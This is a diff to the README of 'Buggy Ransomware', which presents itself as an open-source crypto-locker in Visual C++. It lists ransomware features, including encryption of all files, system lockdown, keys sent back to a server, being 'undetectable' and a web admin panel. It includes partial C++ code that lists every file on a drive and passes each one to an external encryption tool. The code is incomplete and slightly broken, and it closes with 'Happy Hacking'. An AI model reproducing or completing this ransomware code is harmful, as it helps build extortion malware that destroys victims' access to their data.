@@ -6,12 +6,19 @@
 
 Buggy Ransomware is open source  Crypto-Locker. Buggy Ransomware is developed in Visual C++. It has features encrypt all file, lock down the system and send keys back to the server. Multi-threaded functionality helps to this tool make encryption faster.
 
+## Features
+
+1. Strong AES Encryption. (Unbreakable)
+2. LockDown System Functionailty.
+3. Multi-Thread Encryption.
+4. Undetectable.
+5. Powerful Web Admin Interface
 
 ## Step 1 (Fetch files)
 
 Getting all files from all drive to encrypting them.
 
-Here is Visual C++ program get all list directory & files in drive and store path in text file for encryption later use.
+Here is Visual C++ program get all list directory & files in drive and store path in text file for encryption later use. I use Boost C++ libraries to get all files list. Please first setup Boost libraries to compile program.
 
 ```
 #include <boost/config/warning_disable.hpp>
@@ -21,28 +28,39 @@ Here is Visual C++ program get all list directory & files in drive and store pat
 
 using namespace std;
 
-fstream data_file("data.txt", ios::out);
+fstream out_file("data.txt", ios::out);
 
 int main(int argc, char* argv[]) {
 	boost::system::error_code dir_error;
 
-	for (boost::filesystem::recursive_directory_iterator end, dir("d:\\", dir_error); dir != end; dir.increment(dir_error)) {
+	for (boost::filesystem::recursive_directory_iterator end, dir("C:\\Ajay\\", dir_error); dir != end; dir.increment(dir_error)) {
 		if (dir_error.value()) {
 			cerr << "Error accessing file: " << dir_error.message() << endl;
 		}
 		else {
 			cout << dir->path() << endl;
-			data_file << dir->path() << "\n";
+			out_file << dir->path() << "\n";
 		}
 	}
+	out_file.close();
 	system("pause");
-	return 0;
-}
+	
 ```
 
 ## Step 2 (Encrypt files)
 
+Here firstly I get every file path from "data.txt" line by line and send to this crypy tool with type encryption and password. you can also embed all this program in upper loop for getting path and encrypting data recursively.
+
 ```
+out_file.open("data.txt", ios::in);
+	string line;
+	while (out_file.good()) {
+		getline(out_file, line);
+		cout << line << endl;
+		std::string cmmd = "crpt.exe -e -p 4321 ";
+		cmmd += line;
+		system(cmmd.c_str());
+	}
 ```
 
 # Currently in Development....Happy Hacking:)
